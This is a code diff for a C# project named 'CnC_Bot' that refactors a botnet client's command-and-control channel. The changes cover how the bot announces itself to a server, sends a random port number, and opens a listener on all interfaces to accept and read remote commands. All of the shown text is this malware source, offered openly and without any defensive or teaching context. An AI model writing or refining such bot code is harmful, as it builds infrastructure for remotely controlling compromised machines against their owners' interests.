@@ -14,7 +14,7 @@ namespace CnC_Bot
     public class Bot
     {
         private int RandomCommandPort;
-        private Socket CommandsSocket;
+        private TcpListener CommandsListener;
 
         /// <summary>
         /// Make initial contact with the server notifying him there is a new active bot.
@@ -27,14 +27,14 @@ namespace CnC_Bot
         {
             try
             {
-                IPEndPoint localEndPoint = new IPEndPoint(Convert.ToInt64(serverIP), serverPort);
-                Socket connectMessage = new Socket(localEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+                TcpClient initialClient = new TcpClient(serverIP, serverPort);
                 
                 Random rand = new Random();
                 RandomCommandPort = rand.Next(3000, 8000);
+                byte[] buff = Convert.FromBase64String(Convert.ToString(RandomCommandPort));
 
-                connectMessage.Send(Convert.FromBase64String(String.Format("{0}", RandomCommandPort)));
-                connectMessage.Close();
+                initialClient.GetStream().Write(buff, 0, buff.Length);
+                initialClient.Close();
             }
             catch (Exception ex)
             {
@@ -71,15 +71,9 @@ namespace CnC_Bot
         {
             try
             {
-                // Establish the local endpoint for the socket.
-                // Dns.GetHostName returns the name of the host running the application.
-                IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
-                IPAddress ipAddr = ipHost.AddressList[0];
-                IPEndPoint localEndPoint = new IPEndPoint(ipAddr, RandomCommandPort);
+                this.CommandsListener = new TcpListener(IPAddress.Any, RandomCommandPort);
 
-                // Creation TCP/IP Socket using socket Class Costructor
-                this.CommandsSocket = new Socket(ipAddr.AddressFamily,
-                             SocketType.Stream, ProtocolType.Tcp);
+                this.CommandsListener.Start();
             }
             catch (Exception ex)
             {
@@ -92,7 +86,7 @@ namespace CnC_Bot
             try
             {
                 /* Get a new connection from the server */
-                Socket serverCommandSocket = CommandsSocket.Accept();
+                Socket serverCommandSocket = CommandsListener.AcceptSocket();
 
                 byte[] commandData = new byte[2048];
                 serverCommandSocket.Receive(commandData);
